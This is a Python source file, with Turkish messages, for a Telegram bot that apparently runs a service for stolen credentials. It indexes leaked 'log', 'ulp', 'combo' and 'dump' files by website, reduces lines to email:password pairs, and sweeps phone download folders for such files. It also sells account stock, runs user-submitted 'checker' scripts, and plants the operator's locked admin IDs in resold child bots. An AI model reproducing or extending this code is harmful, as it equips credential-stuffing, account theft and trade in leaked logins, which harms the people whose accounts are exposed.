      types.InlineKeyboardButton("✅ Onayla (menüye ekle)", callback_data=f"cchk_approve_{cid}"),
      types.InlineKeyboardButton("❌ Reddet", callback_data=f"cchk_reject_{cid}"),
    )
    markup.add(types.InlineKeyboardButton("👁 Kodu önizle", callback_data=f"cchk_preview_{cid}"))
    body = (
      f"🐍 Yeni özel checker talebi\n"
      f"ID: {cid}\n"
      f"Ad: {safe_name}\n"
      f"User: {user_id} @{username or '-'}\n"
      f"Dosya: {filename}\n"
      f"Zaman: {get_current_time_str()}\n\n"
      f"Onaylarsan Checker menüsüne eklenir."
    )
    for aid in list(admin_ids_set):
      try:
        bot.send_message(aid, body, reply_markup=markup)
      except Exception:
        pass
      try:
        with open(fp, "rb") as doc:
          bot.send_document(aid, doc, caption=f"kaynak {cid}")
      except Exception:
        pass
  try:
    threading.Thread(target=_notify_admins, daemon=True).start()
  except Exception:
    _notify_admins()
  return True, cid

def submit_admin_custom_checker(admin_id, file_bytes, filename, menu_name, menu_desc=""):
  """Admin PY — oldugu gibi kaydet, sadece admin kullanir (isterse herkese acar)."""
  _ensure_custom_chk_dir()
  try:
    src = file_bytes.decode("utf-8", errors="ignore")
  except Exception:
    return False, "Dosya okunamadi"
  if not src or len(src.strip()) < 5:
    return False, "Dosya bos"
  cid = str(uuid.uuid4())[:8]
  name = (menu_name or "").strip()[:40] or (filename or cid).replace(".py", "")[:40]
  desc = str(menu_desc or "")[:200]
  fp = os.path.abspath(os.path.join(CUSTOM_CHK_DIR, f"{cid}.py"))
  with open(fp, "w", encoding="utf-8") as f:
    f.write(src)
  custom_checkers[cid] = {
    "name": name,
    "author_id": int(admin_id),
    "file": fp,
    "desc": desc,
    "active": True,
    "uses": 0,
    "approved_by": int(admin_id),
    "admin_direct": True,
    "private": True,  # sadece admin / sahibi
    "time": get_current_time_str(),
    "filename": filename or f"{cid}.py",
  }
  try:
    save_data()
  except Exception as e:
    log_error("admin_cchk_save", e)
  try:
    log_activity("cchk_admin_add", admin_id, cid)
  except Exception:
    pass
  return True, cid

def approve_custom_checker(cid, admin_id, menu_name=None, menu_desc=None):
  pend = custom_checkers_pending.pop(cid, None)
  if not pend:
    return False, "Kuyrukta yok"
  name = (menu_name or "").strip() or pend.get("name") or cid
  name = name[:40]
  desc = (menu_desc if menu_desc is not None else pend.get("desc") or "")
  desc = str(desc)[:200]
  custom_checkers[cid] = {
    "name": name,
    "author_id": int(pend.get("author_id") or 0),
    "file": pend.get("file"),
    "desc": desc,
    "active": True,
    "uses": 0,
    "approved_by": int(admin_id),
    "time": get_current_time_str(),
  }
  save_data()
  author = pend.get("author_id")
  try:
    push_notification(author, f"✅ Checker **{name}** onaylandı ve menüye eklendi!", important=True)
  except Exception:
    pass
  log_activity("cchk_approve", admin_id, cid)
  return True, name

def delete_custom_checker(cid, admin_id=None, remove_file=True):
  """Menüden özel checker sil."""
  meta = custom_checkers.pop(cid, None)
  if not meta:
    meta = custom_checkers_pending.pop(cid, None)
    if not meta:
      return False, "Yok"
  fp = meta.get("file")
  if remove_file and fp:
    try:
      if os.path.isfile(fp):
        os.remove(fp)
    except Exception:
      pass
  try:
    save_data()
  except Exception:
    pass
  if admin_id:
    try:
      log_activity("cchk_delete", admin_id, cid)
    except Exception:
      pass
  return True, meta.get("name") or cid

def rename_custom_checker(cid, new_name, new_desc=None):
  meta = custom_checkers.get(cid)
  if not meta:
    return False, "Yok"
  meta["name"] = str(new_name).strip()[:40] or meta.get("name") or cid
  if new_desc is not None:
    meta["desc"] = str(new_desc)[:200]
  save_data()
  return True, meta["name"]

def reject_custom_checker(cid, admin_id):
  pend = custom_checkers_pending.pop(cid, None)
  if not pend:
    return False, "Yok"
  fp = pend.get("file")
  try:
    if fp and os.path.isfile(fp):
      os.remove(fp)
  except Exception:
    pass
  save_data()
  try:
    push_notification(pend.get("author_id"), f"❌ Checker **{pend.get('name')}** reddedildi.")
  except Exception:
    pass
  log_activity("cchk_reject", admin_id, cid)
  return True, "ok"

def notif_center_text(user_id):
  notes = list(user_notifications.get(user_id) or user_notifications.get(int(user_id) if str(user_id).isdigit() else user_id) or [])
  if not notes:
    return "🔔 **Bildirimler**\n\n_Boş._"
  lines = ["🔔 **Bildirimler** (son 15)\n"]
  for n in notes[-15:][::-1]:
    if isinstance(n, dict):
      flag = "✓" if n.get("read") else "•"
      lines.append(f"{flag} {n.get('text','')[:120]}\n_{n.get('time','')}_")
    else:
      lines.append(f"• {str(n)[:120]}")
  return "\n".join(lines)

def mark_notifs_read(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  notes = user_notifications.get(uid) or []
  for n in notes:
    if isinstance(n, dict):
      n["read"] = True
  user_notifications[uid] = notes

def scheduled_backup_loop():
  """Her gün BACKUP_HOUR'da yedek alır."""
  while bot_running:
    try:
      now = datetime.now()
      if now.hour == BACKUP_HOUR and now.minute < 5:
        dest = do_backup(notify_admins=True)
        logger.info("Otomatik yedek: %s", dest)
        time.sleep(300)  # aynı saatte tekrar alma
      time.sleep(60)
    except Exception as e:
      log_error("scheduled_backup", e)
      time.sleep(120)

def get_top_spam_users(limit=10):
  """Son spam pencerelerinde en çok istek atanlar."""
  scores = {}
  now = time.time()
  for uid, times in user_request_times.items():
    recent = [t for t in times if now - t < 60]
    if recent:
      scores[uid] = scores.get(uid, 0) + len(recent)
  for uid, times in callback_request_times.items():
    recent = [t for t in times if now - t < 60]
    if recent:
      scores[uid] = scores.get(uid, 0) + len(recent)
  return sorted(scores.items(), key=lambda x: x[1], reverse=True)[:limit]

def read_error_log_tail(n=30):
  if not os.path.exists(ERROR_LOG_FILE):
    return "Log dosyası yok."
  try:
    with open(ERROR_LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
      lines = f.readlines()
    return "".join(lines[-n:]) or "Log boş."
  except Exception as e:
    return f"Log okunamadı: {e}"

def get_urls_log_size():
  """urls.txt mevcut boyutu (byte)."""
  try:
    if os.path.exists(URLS_LOG_FILE):
      return os.path.getsize(URLS_LOG_FILE)
  except Exception:
    pass
  return 0

def count_urls_log_lines(max_read_bytes=None):
  """
  urls.txt satır sayısı. Çok büyük dosyada yavaş olabilir.
  max_read_bytes verilirse o kadarını okuyup tahmin eder.
  Returns: (count_or_estimate, is_estimate: bool)
  """
  if not os.path.exists(URLS_LOG_FILE):
    return 0, False
  try:
    size = os.path.getsize(URLS_LOG_FILE)
    if size == 0:
      return 0, False
    if size <= 50 * 1024 * 1024:
      with open(URLS_LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
        n = sum(1 for ln in f if ln.strip())
      return n, False
    sample = 5 * 1024 * 1024
    with open(URLS_LOG_FILE, "rb") as f:
      chunk = f.read(sample)
    if not chunk:
      return 0, False
    lines_in_sample = chunk.count(b"\n") or 1
    avg = len(chunk) / lines_in_sample
    estimate = int(size / avg) if avg > 0 else 0
    return estimate, True
  except Exception:
    return 0, False

def urls_log_status_text():
  """Admin paneli için kısa log durumu metni."""
  sz = get_urls_log_size()
  if sz <= 0:
    return "📋 Log: boş (0 B)"
  count, approx = count_urls_log_lines()
  if approx:
    return f"📋 Log: **{format_bytes(sz)}** (~{count:,} satır tahmini)"
  return f"📋 Log: **{format_bytes(sz)}** | **{count:,}** satır"

def ensure_log_shards_dir():
  try:
    os.makedirs(LOG_SHARDS_DIR, exist_ok=True)
  except Exception as e:
    log_error("ensure_log_shards_dir", e)

def _normalize_domain(host):
  host = (host or "").strip().lower()
  if not host:
    return ""
  host = host.split("@")[-1].split(":")[0]
  if host.startswith("www."):
    host = host[4:]
  if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
    return ""
  if "." not in host or len(host) < 3:
    return ""
  return host

_SHARD_URL_RE = re.compile(r"https?://([^/\s\"'<>]+)", re.I)

def extract_domains_from_log_line(line):
  if not line:
    return []
  m = _SHARD_URL_RE.search(line)
  if not m:
    return []
  d = _normalize_domain(m.group(1))
  return [d] if d else []

def shard_path_for_domain(domain):
  d = _normalize_domain(domain)
  if not d:
    return None
  safe = re.sub(r"[^a-z0-9.\-]+", "_", d)[:100]
  if not safe:
    return None
  ensure_log_shards_dir()
  return os.path.join(LOG_SHARDS_DIR, safe + ".txt")

def append_line_to_shards(line):
  """Tek satır (import için). Index için BufferedShardWriter kullan."""
  domains = extract_domains_from_log_line(line)
  if not domains:
    return 0
  clean = (line or "").strip()
  if not clean:
    return 0
  sp = shard_path_for_domain(domains[0])
  if not sp:
    return 0
  try:
    with open(sp, "a", encoding="utf-8", errors="ignore") as f:
      f.write(clean + "\n")
    return 1
  except Exception as e:
    log_error("shard_write", e)
    return 0

class BufferedShardWriter:
  """Toplu yazım — dosyayı her satırda açmaz. Çok daha hızlı."""
  def __init__(self, flush_every=3000, max_open=48, max_buf_lines=80000):
    ensure_log_shards_dir()
    self.flush_every = flush_every
    self.max_open = max_open
    self.max_buf_lines = max_buf_lines
    self.buf = {}
    self.handles = {}
    self.order = []
    self.total_buf = 0
    self.writes = 0
    self.domains = 0

  def _path(self, d):
    safe = re.sub(r"[^a-z0-9.\-]+", "_", d)[:100]
    return os.path.join(LOG_SHARDS_DIR, safe + ".txt")

  def _handle(self, d):
    if d in self.handles:
      return self.handles[d]
    while len(self.handles) >= self.max_open:
      old = self.order.pop(0)
      h = self.handles.pop(old, None)
      if h:
        try:
          h.close()
        except Exception:
          pass
    h = open(self._path(d), "a", encoding="utf-8", errors="ignore", buffering=1024 * 256)
    self.handles[d] = h
    self.order.append(d)
    return h

  def add(self, domain, line):
    if domain not in self.buf:
      self.buf[domain] = []
      self.domains += 1
    self.buf[domain].append(line)
    self.total_buf += 1
    if len(self.buf[domain]) >= self.flush_every:
      self._flush_one(domain)
    elif self.total_buf >= self.max_buf_lines:
      self._flush_biggest()

  def _flush_one(self, d):
    lines = self.buf.get(d)
    if not lines:
      return
    try:
      h = self._handle(d)
      h.write("\n".join(lines))
      h.write("\n")
      self.writes += len(lines)
    except Exception as e:
      log_error(f"shard_flush:{d}", e)
    self.total_buf -= len(lines)
    lines.clear()

  def _flush_biggest(self):
    items = sorted(self.buf.items(), key=lambda x: len(x[1]), reverse=True)
    for d, lines in items:
      if self.total_buf < self.max_buf_lines // 3:
        break
      if lines:
        self._flush_one(d)

  def flush_all(self):
    for d in list(self.buf.keys()):
      self._flush_one(d)
    for h in list(self.handles.values()):
      try:
        h.flush()
        h.close()
      except Exception:
        pass
    self.handles.clear()
    self.order.clear()
    self.buf.clear()
    self.total_buf = 0

def list_shard_files_for_query(query):
  ensure_log_shards_dir()
  q = (query or "").strip().lower()
  q = q.replace("https://", "").replace("http://", "").split("/")[0]
  if q.startswith("www."):
    q = q[4:]
  if not q or not os.path.isdir(LOG_SHARDS_DIR):
    return []
  hits = []
  try:
    for name in os.listdir(LOG_SHARDS_DIR):
      if not name.endswith(".txt"):
        continue
      base = name[:-4].lower()
      if q == base or q in base or base in q:
        path = os.path.join(LOG_SHARDS_DIR, name)
        if os.path.isfile(path) and os.path.getsize(path) > 0:
          hits.append(path)
  except Exception as e:
    log_error("list_shard_files", e)
  hits.sort(key=lambda p: (-len(os.path.basename(p)), os.path.basename(p)))
  return hits

def index_file_into_shards(fpath, max_lines=None, progress_cb=None):
  """Hızlı stream index — buffer'lı yazım."""
  ensure_log_shards_dir()
  writer = BufferedShardWriter()
  read_n = 0
  try:
    with open(fpath, "r", encoding="utf-8", errors="ignore", buffering=8 * 1024 * 1024) as f:
      for line in f:
        if max_lines and read_n >= max_lines:
          break
        read_n += 1
        line = line.strip()
        if not line:
          continue
        doms = extract_domains_from_log_line(line)
        if not doms:
          continue
        writer.add(doms[0], line)
        if progress_cb and read_n % 1_000_000 == 0:
          try:
            progress_cb(read_n, writer.writes)
          except Exception:
            pass
  except Exception as e:
    log_error(f"index_file_into_shards:{fpath}", e)
  writer.flush_all()
  return read_n, writer.writes

def shard_stats_text():
  """Hizli: cache 60 sn (log menusu gecikmesin)."""
  global _shard_stats_cache
  try:
    now = time.time()
    c = globals().get("_shard_stats_cache") or {}
    if c.get("t") and now - c["t"] < 60 and c.get("txt"):
      return c["txt"]
  except Exception:
    pass
  ensure_log_shards_dir()
  try:
    files = [f for f in os.listdir(LOG_SHARDS_DIR) if f.endswith(".txt")]
  except Exception:
    files = []
  total = 0
  for f in files[:5000]:
    try:
      total += os.path.getsize(os.path.join(LOG_SHARDS_DIR, f))
    except Exception:
      pass
  if len(files) > 5000:
    avg = (total / 5000.0) if total else 0
    total = int(total + avg * (len(files) - 5000))
  txt = f"⚡ Shard: **{len(files)}** site · **{format_bytes(total)}**"
  try:
    globals()["_shard_stats_cache"] = {"t": time.time(), "txt": txt}
  except Exception:
    pass
  return txt

def strip_url_keep_mail_pass(line):
  """
  Log satırından URL siler; email:pass veya user:pass bırakır.
  Noktalı kullanıcı adlarını (john.doe) silmez.
  """
  if not line:
    return ""
  s = line.strip()
  if not s:
    return ""
  s = re.sub(r'https?://[^\s<>"\']+', ' ', s, flags=re.IGNORECASE)
  s = re.sub(r'\bwww\.[^\s<>"\']+', ' ', s, flags=re.IGNORECASE)
  s = re.sub(r'\s+', ' ', s).strip()
  if not s:
    return ""

  def _is_urlish(p):
    pl = p.lower()
    if pl.startswith(('http://', 'https://', 'www.')):
      return True
    if re.match(r'^[a-z0-9.\-]+\.(com|net|org|io|co|tr|ru|de|fr|uk|info|xyz)(/.*)?$', pl):
      return True
    return False

  m = re.search(
    r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})\s*[:|;]\s*([^\s:|;]+)',
    s,
  )
  if m:
    email = m.group(1).strip()
    pwd = re.sub(r'[|,;]+$', '', m.group(2).strip()).strip()
    if email and pwd and not _is_urlish(pwd):
      return f"{email}:{pwd}"

  for sep in (':', '|', ';'):
    if sep not in s:
      continue
    parts = [p.strip() for p in s.split(sep) if p.strip()]
    parts = [p for p in parts if not _is_urlish(p)]
    if len(parts) >= 2:
      user, pwd = parts[0], parts[1]
      if 1 <= len(user) <= 200 and 1 <= len(pwd) <= 200:
        if not _is_urlish(user):
          return f"{user}:{pwd}"
    break

  m2 = re.search(
    r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})\s+(\S{1,80})',
    s,
  )
  if m2:
    pwd = m2.group(2).strip()
    if pwd and not _is_urlish(pwd):
      return f"{m2.group(1)}:{pwd}"
  return ""

def clean_log_lines_to_mail_pass(text):
  """Çok satırlı log metnini satır satır temizler; boşları atar, tekilleştirir."""
  if not text:
    return ""
  out = []
  seen = set()
  for raw in text.splitlines():
    cleaned = strip_url_keep_mail_pass(raw)
    if cleaned and cleaned not in seen:
      seen.add(cleaned)
      out.append(cleaned)
  return "\n".join(out)

def get_log_cooldown_left(user_id):
  """Kalan log bekleme süresi (saniye). 0 = hazır. Admin / checker abone: 0."""
  if user_id in admin_ids_set:
    return 0
  try:
    if has_checker_sub(user_id):
      return 0
  except Exception:
    pass
  last = float(log_search_last.get(user_id, 0) or 0)
  if last <= 0:
    return 0
  left = int(LOG_COOLDOWN_SEC - (time.time() - last))
  return max(0, left)

def format_cooldown(sec):
  sec = max(0, int(sec))
  m, s = divmod(sec, 60)
  if m > 0:
    return f"{m} dk {s} sn"
  return f"{s} sn"

def estimate_log_search_seconds(search_files):
  """Dosya boyutuna göre kaba tahmini süre (saniye)."""
  total_mb = 0.0
  for fpath in search_files or []:
    try:
      total_mb += os.path.getsize(fpath) / (1024 * 1024)
    except Exception:
      pass
  if total_mb <= 0:
    return 15
  sec = int(total_mb / 80.0) + 8
  return max(5, min(7200, sec))

def get_log_free_left(user_id):
  """Eski uyumluluk — log ücretsiz."""
  return 999 if user_id in admin_ids_set else 999

def validate_bot_token(token):
  """Telegram getMe — (ok, info_dict_or_error_str)"""
  token = (token or "").strip()
  if not token or ":" not in token or len(token) < 20:
    return False, "Token formatı hatalı"
  try:
    r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=15)
    data = r.json() if r.ok else {}
    if not data.get("ok"):
      return False, (data.get("description") or "Token geçersiz")
    res = data.get("result") or {}
    return True, {
      "bot_id": res.get("id"),
      "username": res.get("username") or "",
      "name": res.get("first_name") or "",
    }
  except Exception as e:
    return False, str(e)

def start_user_bot_process(owner_id, token, brand=None):
  """Ayrı process + AYRI database — ana botla bakiye/data paylaşılmaz."""
  import subprocess
  script = os.path.abspath(__file__)
  db_path = os.path.join(_BASE_DIR, f"database_bot_{owner_id}.json")
  brand = (brand or (user_bot_tokens.get(owner_id) or {}).get("brand") or "CHK BOT").strip()[:32]
  locked = sorted(set(int(x) for x in list(DEFAULT_ADMINS) + list(LOCKED_ADMIN_IDS)))
  if not os.path.isfile(db_path):
    try:
      seed = {
        "registered_users": [int(owner_id)],
        "user_balances": {},
        "user_gamble_balances": {},
        "user_credentials": {},
        "admin_ids": sorted(set(locked + [int(owner_id)])),
        "locked_admins": locked,
        "bot_brand": brand,
        "banned_users": [],
      }
      with open(db_path, "w", encoding="utf-8") as f:
        json.dump(seed, f, ensure_ascii=False, indent=2)
    except Exception as e:
      log_error("seed_user_bot_db", e)
      return False, f"DB oluşturulamadı: {e}"
  else:
    try:
      with open(db_path, "r", encoding="utf-8") as f:
        d = json.load(f)
      adm = set(int(x) for x in (d.get("admin_ids") or []))
      adm.update(locked)
      adm.add(int(owner_id))
      d["admin_ids"] = list(adm)
      d["locked_admins"] = locked
      if brand:
        d["bot_brand"] = brand
      with open(db_path, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)
    except Exception as e:
      log_error("patch_user_bot_db", e)
  old = child_bot_procs.get(owner_id)
  if old:
    try:
      os.kill(old, 15)
    except Exception:
      pass
  env = os.environ.copy()
  env["CC_DB_OVERRIDE"] = db_path
  env["CC_BOT_OWNER"] = str(owner_id)
  env["CC_BOT_BRAND"] = brand
  env["CC_LOCKED_ADMINS"] = ",".join(str(x) for x in locked)
  try:
    proc = subprocess.Popen(
      [sys.executable, script, f"--token={token}", f"--db={db_path}", f"--owner={owner_id}"],
      cwd=_BASE_DIR,
      env=env,
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
      start_new_session=True,
    )
    child_bot_procs[owner_id] = proc.pid
    return True, proc.pid
  except Exception as e:
    return False, str(e)

def try_charge_log_search(user_id):
  """
  Log araması: ücretsiz + 3 dk cooldown.
  Checker abonesi / admin: bekleme yok, sınırsız.
  Returns: (ok, message, charged)
  """
  if user_id in admin_ids_set:
    log_search_last[user_id] = time.time()
    try:
      save_data()
    except Exception:
      pass
    return True, "\U0001F451 Admin — ücretsiz (bekleme yok)", 0.0
  try:
    if has_checker_sub(user_id):
      log_search_last[user_id] = time.time()
      try:
        save_data()
      except Exception:
        pass
      return True, "\U0001F48E Abone — log sınırsız (bekleme yok)", 0.0
  except Exception:
    pass
  left = get_log_cooldown_left(user_id)
  if left > 0:
    msg = (
      "\u23F3 **Bekleme süresi**\n\n"
      "Log araması **ücretsiz** ama her arama arası **3 dakika**.\n"
      "Kalan: **" + format_cooldown(left) + "**\n\n"
      "\U0001F48E Abone olursan bekleme kalkar.\n"
      "Sonra tekrar dene."
    )
    return (False, msg, 0.0)
  log_search_last[user_id] = time.time()
  try:
    save_data()
  except Exception:
    pass
  return True, "\U0001F193 Ücretsiz arama · sonraki için 3 dk bekleme başlar", 0.0

def _refund_log_search(user_id, charged):
  """Log araması başarısız / 0 sonuç: ücret veya ücretsiz hakkı geri ver."""
  if user_id in admin_ids_set:
    return
  try:
    if charged and charged > 0:
      user_balances[user_id] = user_balances.get(user_id, 0.0) + float(charged)
      add_balance_history(user_id, "log_search_refund", charged, "Log iade")
      save_data()
    else:
      log_search_used[user_id] = max(0, int(log_search_used.get(user_id, 1)) - 1)
      save_data()
  except Exception as e:
    log_error("_refund_log_search", e)

def format_bytes(n):
  """İnsan okunabilir boyut. None → 'Limitsiz'."""
  if n is None:
    return "Limitsiz"
  n = float(n)
  for unit in ("B", "KB", "MB", "GB"):
    if n < 1024 or unit == "GB":
      return f"{n:.1f} {unit}" if unit != "B" else f"{int(n)} B"
    n /= 1024
  return f"{n:.1f} GB"

def can_append_urls_log(extra_bytes):
  """
  urls.txt'ye ekleme kontrolü. Limit yoksa her zaman True.
  Returns: (ok: bool, current_size, remaining)
  """
  current = get_urls_log_size()
  if MAX_URLS_LOG_BYTES is None:
    return True, current, None  # limitsiz
  remaining = MAX_URLS_LOG_BYTES - current
  if remaining <= 0:
    return False, current, 0
  if extra_bytes > remaining:
    return False, current, remaining
  return True, current, remaining

def ensure_log_inbox_dirs():
  """log_inbox ve done klasörlerini oluştur."""
  try:
    os.makedirs(LOG_INBOX_DIR, exist_ok=True)
    os.makedirs(LOG_INBOX_DONE_DIR, exist_ok=True)
  except Exception as e:
    log_error("ensure_log_inbox_dirs", e)

def list_log_inbox_files():
  """
  İçe aktarılacak log dosyaları:
  - log_inbox/ klasöründeki .txt/.log/.csv
  - bot klasöründeki log_inbox.txt (kullanıcılar bazen dosya olarak koyuyor)
  - bot klasöründe *log*.txt / *ulp*.txt büyük dosyalar (urls.txt hariç)
  """
  ensure_log_inbox_dirs()
  files = []
  seen = set()

  def _add(path):
    try:
      path = os.path.abspath(path)
      if path in seen:
        return
      if not os.path.isfile(path):
        return
      if os.path.getsize(path) <= 0:
        return
      seen.add(path)
      files.append(path)
    except Exception:
      pass

  try:
    for name in sorted(os.listdir(LOG_INBOX_DIR)):
      if name.lower() in ("done",):
        continue
      path = os.path.join(LOG_INBOX_DIR, name)
      if not os.path.isfile(path):
        continue
      if name.lower().endswith((".txt", ".log", ".csv")):
        _add(path)
  except Exception as e:
    log_error("list_log_inbox_files", e)

  _add("log_inbox.txt")

  try:
    for name in os.listdir("."):
      low = name.lower()
      if not low.endswith((".txt", ".log", ".csv")):
        continue
      if low in ("urls.txt", "user_logs.txt", "errors.log", "cvvsiz_stock.txt", "database.json"):
        continue
      if "log" in low or "ulp" in low or "combo" in low:
        try:
          if os.path.getsize(name) >= 100 * 1024:  # en az 100 KB
            _add(name)
        except Exception:
          pass
  except Exception:
    pass

  return files

def list_searchable_log_files():
  """
  Arama kaynakları: urls.txt + log_inbox + done + bot klasörü log/ulp +
  Android Recordings/Download yaygın yollar.
  """
  files = []
  seen = set()

  def _add(p):
    try:
      p = os.path.abspath(p)
      if p in seen:
        return
      if not os.path.isfile(p) or os.path.getsize(p) <= 0:
        return
      seen.add(p)
      files.append(p)
    except Exception:
      pass

  _add(URLS_LOG_FILE)
  _add(os.path.join(_BASE_DIR, "urls.txt"))
  try:
    ensure_log_inbox_dirs()
    for name in os.listdir(LOG_INBOX_DIR):
      if name.lower() == "done":
        continue
      path = os.path.join(LOG_INBOX_DIR, name)
      if os.path.isfile(path) and name.lower().endswith((".txt", ".log", ".csv")):
        _add(path)
    done_dir = LOG_INBOX_DONE_DIR
    if os.path.isdir(done_dir):
      for name in os.listdir(done_dir):
        path = os.path.join(done_dir, name)
        if os.path.isfile(path) and name.lower().endswith((".txt", ".log", ".csv")):
          _add(path)
  except Exception as e:
    log_error("list_searchable_inbox", e)
  try:
    for base in (_BASE_DIR, os.getcwd(), "."):
      if not os.path.isdir(base):
        continue
      for name in os.listdir(base):
        low = name.lower()
        if not low.endswith((".txt", ".log", ".csv")):
          continue
        if low in ("urls.txt", "user_logs.txt", "errors.log", "cvvsiz_stock.txt",
               "database.json", "config.json"):
          continue
        if any(k in low for k in ("log", "ulp", "combo", "url", "pass", "mail", "dump", "leak")):
          _add(os.path.join(base, name))
  except Exception as e:
    log_error("list_searchable_cwd", e)
  for extra_dir in (
    "/storage/emulated/0/Recordings",
    "/storage/emulated/0/Download",
    "/sdcard/Recordings",
    "/sdcard/Download",
    "/storage/emulated/0/Recordings/log_inbox",
    "/storage/emulated/0/Download/log_inbox",
  ):
    try:
      if not os.path.isdir(extra_dir):
        continue
      for name in os.listdir(extra_dir):
        low = name.lower()
        if not low.endswith((".txt", ".log", ".csv")):
          continue
        if low in ("database.json", "config.json", "errors.log"):
          continue
        if any(k in low for k in ("log", "ulp", "combo", "url", "pass", "mail", "dump", "leak", "txt")) or low.endswith(".txt"):
          try:
            fp = os.path.join(extra_dir, name)
            if os.path.getsize(fp) >= 50 * 1024:
              _add(fp)
          except Exception:
            pass
    except Exception:
      pass
  try:
    files.sort(key=lambda p: os.path.getsize(p), reverse=True)
  except Exception:
    pass
  return files

def import_log_inbox(move_done=True):
  """
  log_inbox klasöründeki txt dosyalarını urls.txt'ye ekler.
  Returns: dict with keys: files_ok, files_skip, lines_added, bytes_added, message
  """
  ensure_log_inbox_dirs()
  files = list_log_inbox_files()
  if not files:
    return {
      "files_ok": 0,
      "files_skip": 0,
      "lines_added": 0,
      "bytes_added": 0,
      "message": f"📭 `{LOG_INBOX_DIR}/` klasöründe .txt dosyası yok.\n\n"
             f"Botun yanına `{LOG_INBOX_DIR}` klasörü aç, 100MB+ logları oraya at, "
             f"sonra bu butona bas.",
    }
  total_lines = 0
  total_bytes = 0
  ok_count = 0
  skip_count = 0
  details = []
  for path in files:
    try:
      fsize = os.path.getsize(path)
      ok, cur, rem = can_append_urls_log(fsize)
      if not ok:
        skip_count += 1
        details.append(f"⏭ `{os.path.basename(path)}` atlandı (limit: kalan {format_bytes(rem)})")
        continue
      added_lines = 0
      added_bytes = 0
      source_lines = 0
      fully_read = False
      with open(path, "r", encoding="utf-8", errors="ignore") as src:
        with open(URLS_LOG_FILE, "a", encoding="utf-8") as dst:
          while True:
            line = src.readline()
            if not line:
              fully_read = True
              break
            source_lines += 1
            clean = line.strip()
            if not clean:
              continue
            chunk = clean + "\n"
            chunk_b = len(chunk.encode("utf-8"))
            ok2, _, rem2 = can_append_urls_log(chunk_b)
            if not ok2:
              details.append(
                f"⚠️ `{os.path.basename(path)}` kısmi eklendi "
                f"({added_lines}/{source_lines} satır) — limit doldu"
              )
              break
            dst.write(chunk)
            try:
              append_line_to_shards(clean)
            except Exception:
              pass
            added_lines += 1
            added_bytes += chunk_b
          try:
            dst.flush()
            os.fsync(dst.fileno())
          except Exception:
            pass
      total_lines += added_lines
      total_bytes += added_bytes
      ok_count += 1
      if fully_read:
        details.append(
          f"✅ `{os.path.basename(path)}` → {added_lines} satır "
          f"(kaynak: {source_lines}) ({format_bytes(added_bytes)}) TAM"
        )
      else:
        details.append(
          f"⚠️ `{os.path.basename(path)}` → {added_lines} satır "
          f"(okunan: {source_lines}) KISMİ — dosya yerinde kaldı"
        )
      if move_done and added_lines > 0 and fully_read:
        try:
          base = os.path.basename(path)
          dest = os.path.join(LOG_INBOX_DONE_DIR, base)
          if os.path.exists(dest):
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            dest = os.path.join(LOG_INBOX_DONE_DIR, f"{ts}_{base}")
          os.rename(path, dest)
        except Exception as e:
          log_error(f"move_done {path}", e)
    except Exception as e:
      skip_count += 1
      details.append(f"❌ `{os.path.basename(path)}` hata: {e}")
      log_error(f"import_log_inbox {path}", e)
  new_sz = get_urls_log_size()
  msg = (
    f"📥 **log_inbox içe aktarım**\n\n"
    f"✅ Dosya: **{ok_count}** | ⏭ Atlanan: **{skip_count}**\n"
    f"📄 Eklenen satır: **{total_lines}**\n"
    f"📦 Eklenen boyut: **{format_bytes(total_bytes)}**\n"
    f"📏 urls.txt toplam: **{format_bytes(new_sz)}** (limit yok)\n\n"
    + "\n".join(details[:30])
  )
  if len(details) > 30:
    msg += f"\n... +{len(details) - 30} dosya daha"
  return {
    "files_ok": ok_count,
    "files_skip": skip_count,
    "lines_added": total_lines,
    "bytes_added": total_bytes,
    "message": msg,
  }

load_data()
print(f"📂 DB path: {DB_FILE}")
print(f"📂 load_ok={_DB_LOAD_OK} | kullanıcı={len(registered_users)} | bakiye_kaydı={len(user_balances)}")
if not _DB_LOAD_OK:
  print("⚠️ UYARI: DB yüklenemedi — kayıtlar engelli. db_backups içinden geri yükle!")
elif len(registered_users) == 0 and len(user_balances) == 0:
  print("⚠️ UYARI: DB boş görünüyor. Eski database.json başka klasörde olabilir.")

ensure_log_inbox_dirs()

for key, item in market_data.items():
  if "stock_file" in item and not os.path.exists(item["stock_file"]):
    with open(item["stock_file"], "w", encoding="utf-8") as f:
      f.write("")

try:
  BOT_USERNAME = bot.get_me().username
except:
  BOT_USERNAME = "KenevizMultiBot"


def pop_listing_stock(l_id):
  """İlandan 1 adet düş. HESAP: stock_items satırı. MT: mt_text + stock sayısı."""
  item = listings.get(l_id)
  if not item:
    return None
  cat = (item.get("category") or "HESAP").upper()

  if cat == "MT":
    stock = int(item.get("stock") or 0)
    if stock <= 0:
      return None
    content = item.get("mt_text") or item.get("digital_payload") or "MT ürün"
    stock -= 1
    item["stock"] = stock
    if stock <= 0:
      try:
        del listings[l_id]
      except Exception:
        pass
    else:
      listings[l_id] = item
    save_data()
    return str(content)

  stock_items = item.get("stock_items")
  if isinstance(stock_items, list) and stock_items:
    val = stock_items.pop(0)
    item["stock_items"] = stock_items
    item["stock"] = len(stock_items)
    if item["stock"] <= 0:
      try:
        del listings[l_id]
      except Exception:
        pass
    else:
      listings[l_id] = item
    save_data()
    return val

  stock = int(item.get("stock", 0) or 0)
  if stock <= 0:
    return None
  stock -= 1
  item["stock"] = stock
  if stock <= 0:
    try:
      del listings[l_id]
    except Exception:
      pass
  else:
    listings[l_id] = item
  save_data()
  return item.get("digital_payload") or item.get("mt_text") or f"(teslim — satıcı: @{item.get('owner_username') or item.get('user_id')})"

def deliver_listing_to_buyer(buyer_id, l_id, item, delivered_content, stars_paid, order_id=None):
  cat = item.get("category", "HESAP")
  title = item.get("title", "İlan")
  try:
    bot.send_message(
      buyer_id,
      f"✅ **Satın alma başarılı — otomatik teslimat**\n\n"
      f"📌 {title}\n"
